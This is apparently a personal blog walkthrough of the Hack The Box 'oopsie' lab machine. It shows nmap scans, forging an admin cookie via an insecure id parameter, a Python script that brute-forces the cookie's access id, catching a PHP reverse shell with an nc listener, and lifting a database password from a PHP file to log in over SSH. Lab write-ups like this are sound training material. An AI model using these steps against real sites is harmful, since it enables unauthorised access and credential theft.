---
layout: post
title: oopsie
tags:
- htb
- starting_point
- oopsie
author: nicoliboli
description: starting point | tier 2 | box 1
---

# enumeration

```
$ nmap -T5 10.129.140.193
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-08 14:43 EDT
Nmap scan report for 10.129.140.193
Host is up (0.10s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.44 seconds

$ nmap -T5 -sC -sV -p 22,80 10.129.140.193
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-08 14:44 EDT
Nmap scan report for 10.129.140.193
Host is up (0.099s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Welcome
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.91 seconds
```

## port 80

![oopsie_homepage](/assets/img/oopsie_homepage.png)

scroll down to the bottom of the page and see a domain as well

![oopsie_domain](/assets/img/oopsie_domain.png)

also open burp to see what is being fetched when the page loads

![oopsie_home_burp](/assets/img/oopsie_home_burp.png)

try visiting that `/cdn-cgi/login` page and get a login prompt

![oopsie_login](/assets/img/oopsie_login.png)

click the `Login as Guest` link and get access to the following page

![oopsie_guest](/assets/img/oopsie_guest.png)

click around the top menu buttons and see a couple interesting things. under `Account`, i see the information that's populating my cookie

![oopsie_account](/assets/img/oopsie_account.png)

![oopsie_cookie](/assets/img/oopsie_cookie.png)

note that i can't get to the `Uploads` page because i don't have 'super admin rights'

![oopsie_uploads](/assets/img/oopsie_uploads.png)

# exploitation

now to test what i can get done by changing the cookie. send the request to repeater and change the role to `admin`. earlier i saw on the homepage the `admin` username in the contact section. since `guest` has the same domain, i'm going to make an educated guess that `admin` is also a name used. when the request has the correct values for `user` and `role`, i get a 200 response. `user` corresponds to the access id and `role` i am going to guess corresponds to the user.

![oopsie_burp_cookie](/assets/img/oopsie_burp_cookie.png)


i tested this latter part out and turns out you don't really need the `role` cookie. now instead the main dashboard, i'm going to fuzz that `user` cookie value until i get a response that doesn't contain the string `This action require super admin rights`. if the response doesn't contain that string, i can assume the guessed value correlates to the `admin` access id 

```
$ cat req.py           
import sys
import requests
import argparse
from random import randrange
from bs4 import BeautifulSoup

proxy = { "http" : "http://127.0.0.1:8080" }

parser = argparse.ArgumentParser(epilog="ex: python {} -u http://10.129.140.193".format(sys.argv[0]))

parser.add_argument('-u', '--url', required=True, help='url')
args = parser.parse_args()

for i in range(2230,65536):
    print("[*] access id: {}".format(i))
    s = requests.Session()
    cookies = { "user" : str(i),
               "role" : "admin" }
    r = s.get("{}/cdn-cgi/login/admin.php?content=uploads".format(args.url), proxies=proxy, cookies=cookies, allow_redirects=False)
    if r.text.find("super admin rights") == -1 and r.status_code == 200:
        print("[+] access id found!")
        sys.exit(0)
```

while i let that run, i kept looking around and notices the `id` parameter in the url on the `Accounts` page. when i changed it to 1, i was able to see the `admin` user's access id, which is 34322

![oopsie_id](/assets/img/oopsie_id.png)

i kept playing with the `id` parameter and found the user `john` with an email of `john@tafcz.co.uk` and an access id of 8832

found out that the `user` cookie is the only one that matters, so entered the value of 34322 for the `user` cookie and got access to the `Uploads` page

![oopsie_cookie_edit](/assets/img/oopsie_cookie_edit.png)

![oopsie_uploadpage](/assets/img/oopsie_uploadpage.png)

since the site uses php as its engine, try uploading a php reverse shell

![oopsie_phprevshell](/assets/img/oopsie_phprevshell.png)

so now i just need to find out where it's uploaded to and was able to get in on a guess. otherwise i would have used `gobuster` to try to suss it out. i did have to do this a couple times 

```
$ nc -lvnp 42069             
listening on [any] 42069 ...
connect to [10.10.14.149] from (UNKNOWN) [10.129.140.193] 39022
Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 20:06:51 up  1:23,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:94:a5:0a brd ff:ff:ff:ff:ff:ff
    inet 10.129.140.193/16 brd 10.129.255.255 scope global ens160
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:fe94:a50a/64 scope global dynamic mngtmpaddr 
       valid_lft 86398sec preferred_lft 14398sec
    inet6 fe80::250:56ff:fe94:a50a/64 scope link 
       valid_lft forever preferred_lft forever
```

![oopsie_user_flag](/assets/img/oopsie_user_flag.png)

# privesc

ran `linpeas` and didn't get much, so poked around a bit myself and found a password for the user `robert` that is used to acces the `garage` db

```
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

used those creds to ssh as `robert`. get all that info

![oopsie_garage_db](/assets/img/oopsie_garage_db.png)